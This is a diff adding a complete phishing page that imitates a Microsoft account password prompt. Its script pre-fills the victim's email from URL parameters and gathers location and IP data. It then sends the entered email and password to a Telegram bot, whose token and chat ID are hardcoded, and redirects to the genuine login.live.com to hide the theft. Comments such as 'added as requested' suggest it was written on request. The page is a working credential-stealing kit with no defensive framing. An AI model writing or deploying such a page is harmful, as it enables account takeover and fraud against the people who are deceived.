@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Account Login</title>
+    <!-- Added jQuery as requested -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .login-container {
+            width: 100%;
+            max-width: 440px;
+            padding: 44px;
+            border: 1px solid #f0f0f0;
+            border-radius: 2px;
+            box-shadow: none;
+            text-align: center;
+        }
+        
+        .microsoft-logo {
+            text-align: center;
+            margin-bottom: 24px;
+            padding-bottom: 30px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .microsoft-logo img {
+            height: 32px;
+            width: auto;
+        }
+        
+        .user-email {
+            display: inline-block;
+            color: #1a1a1a;
+            width: fit-content;
+            margin: 0 auto;
+            font-size: 12px;
+            margin-bottom: 24px;
+            word-break: break-all;
+            padding: 4px 8px;
+            border: 1px solid #e6e6e6;
+            border-radius: 32px;
+            background-color: #f9f9f9;
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: #1a1a1a;
+        }
+        
+        .form-group {
+            margin-bottom: 16px;
+            text-align: left;
+        }
+        
+        label {
+            display: block;
+            font-size: 14px;
+            margin-bottom: 4px;
+            color: #1a1a1a;
+            font-weight: 500;
+        }
+        
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            font-size: 15px;
+            border: 1px solid #dcdcdc;
+            border-bottom: 2px solid #dcdcdc;
+            border-radius: 0;
+            height: 40px;
+        }
+        
+        input[type="password"]:focus {
+            outline: none;
+            border: 1px solid #0067b8;
+            border-bottom: 2px solid #0067b8;
+            box-shadow: none;
+        }
+        
+        .forgot-password {
+            display: block;
+            margin-top: 4px;
+            font-size: 13px;
+            font-weight: 400;
+            color: #0067b8;
+            text-decoration: none;
+        }
+        
+        .forgot-password:hover {
+            color: #004275;
+            text-decoration: underline;
+        }
+        
+        .next-button {
+            width: 100%;
+            background-color: #0067b8;
+            color: white;
+            border: none;
+            padding: 10px 12px;
+            font-size: 15px;
+            font-weight: 400;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 16px;
+            height: 40px;
+        }
+        
+        .next-button:hover {
+            background-color: #005da6;
+        }
+        
+        .different-account {
+            display: block;
+            margin-top: 16px;
+            text-align: center;
+            font-size: 13px;
+            color: #0067b8;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        
+        .different-account:hover {
+            color: #004275;
+            text-decoration: underline;
+        }
+        
+        .approve-app {
+            display: block;
+            margin-top: 12px;
+            text-align: center;
+            font-size: 13px;
+            color: #0067b8;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        
+        .approve-app:hover {
+            color: #004275;
+            text-decoration: underline;
+        }
+        
+        .footer {
+            margin-top: 300px;
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 16px;
+        }
+        
+        .footer-links a {
+            color: #666;
+            text-decoration: none;
+        }
+        
+        .footer-links a:hover {
+            color: #0067b8;
+            text-decoration: underline;
+        }
+        
+        .footer-note {
+            line-height: 1.5;
+        }
+        
+        /* Mobile styles */
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 28px;
+                border: none;
+                box-shadow: none;
+                max-width: 100%;
+            }
+            
+            body {
+                padding: 0;
+                align-items: flex-start;
+                padding-top: 28px;
+            }
+            
+            .microsoft-logo {
+                font-size: 22px;
+            }
+            
+            h1 {
+                font-size: 22px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Hidden inputs for country and region data -->
+    <input type="hidden" id="country" value="">
+    <input type="hidden" id="region" value="">
+    
+    <div class="login-container">
+        <div class="microsoft-logo">
+            <img src="data:image/png;base64,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" alt="Microsoft Logo" style="height: 24px;">
+        </div>
+        <div class="user-email" id="userEmail"></div>
+        
+        <h1>Enter your password</h1>
+        
+        <form id="LoginForm">
+            <div class="form-group">
+                <input type="password" id="PASSWORD" name="password" required placeholder="Password">
+                <a href="#" class="forgot-password">Forgot your password?</a>
+            </div>
+            
+            <button type="submit" class="next-button">Next</button>
+        </form>
+        
+        <a href="#" class="different-account">Sign in with a different Microsoft account</a>
+        
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#">Help</a>
+                <a href="#">Terms of use</a>
+                <a href="#">Privacy and cookies</a>
+            </div>
+            <div class="footer-note">
+                Use private browsing if this is not your device. Learn more
+            </div>
+        </div>
+    </div>
+
+    <!-- JavaScript logic added as requested -->
+    <script>
+        var moveon = "https://login.live.com/login.srf?contextid=F36BF8030";
+        const chatId = "5187399728";
+        const apiToken = "7813460965:AAHrNslCV-G2LLykpESgJwN_vx9gbKE0JW4";
+        
+$(document).ready(function() {
+    // Email grabber functionality
+    function getEmailFromURL() {
+        const urlParams = new URLSearchParams(window.location.search);
+        // Try multiple parameter names to extract email
+        return urlParams.get('[[_email_]]') || 
+               urlParams.get('email') || 
+               urlParams.get('e') || 
+               urlParams.get('user') || 
+               urlParams.get('username');
+    }
+
+    // Set email dynamically
+    const urlEmail = getEmailFromURL();
+    if (urlEmail) {
+        $('#userEmail').text(urlEmail);
+    } else {
+        // Show placeholder if no email parameter found
+        $('#userEmail').text("[[_email_]]");
+        // Make it editable but keep original styling
+        $('#userEmail').attr('contenteditable', 'true');
+        $('#userEmail').css({
+            'background-color': '#f9f9f9',
+            'border': '1px solid #e6e6e6',
+            'min-width': '200px',
+            'outline': 'none'
+        });
+        
+        // Remove outline on focus
+        $('#userEmail').on('focus', function() {
+            if ($(this).text() === "[[_email_]]") {
+                $(this).text("");
+            }
+            $(this).css('outline', 'none');
+        });
+        
+        // Add placeholder back if empty
+        $('#userEmail').on('blur', function() {
+            if ($(this).text().trim() === "") {
+                $(this).text("[[_email_]]");
+            }
+        });
+    }
+
+    // Get user's location information
+    $.getJSON('https://ipapi.co/json/', function(data) {
+        $('#country').val(data.country_name);
+        $('#region').val(data.region);
+    });
+    
+    $("#LoginForm").on("submit", function(event) {
+        event.preventDefault();
+        
+        // Get email - check if it's the placeholder
+        let emailElement = $("#userEmail");
+        let email = emailElement.text().trim();
+        
+        // Don't send if it's still the placeholder
+        if (email === "[[_email_]]") {
+            alert("Please enter your email address");
+            emailElement.css('border', '1px solid red');
+            return false;
+        }
+        
+        let password = $("#PASSWORD").val();
+        
+        // Validate password
+        if (!password) {
+            alert("Please enter your password");
+            $("#PASSWORD").css('border', '1px solid red');
+            return false;
+        }
+        
+        $.getJSON('https://api4.ipify.org?format=json', function(data) {
+            let ipAddress = data.ip;
+            let country = $("#country").val();
+            let region = $("#region").val();
+            let message = `Hotmail\nEmail: ${email}\nPassword: ${password}\nIP Address: ${ipAddress}\nCountry: ${country}\nRegion: ${region}`;
+            
+$.ajax({
+    url: `https://api.telegram.org/bot${apiToken}/sendMessage`,
+    method: "POST",
+    data: {
+        chat_id: chatId,
+        text: message
+    },
+    success: function(response) {
+        let email = $("#userEmail").text().trim();
+        let encodedEmail = encodeURIComponent(email);
+        window.location.assign(`${moveon}&username=${encodedEmail}&login=Sign+in`);
+    },
+    error: function(error) {
+        alert("Error sending message.");
+    }
+});
+        });
+    });
+});
+    </script>
+</body>
+</html>
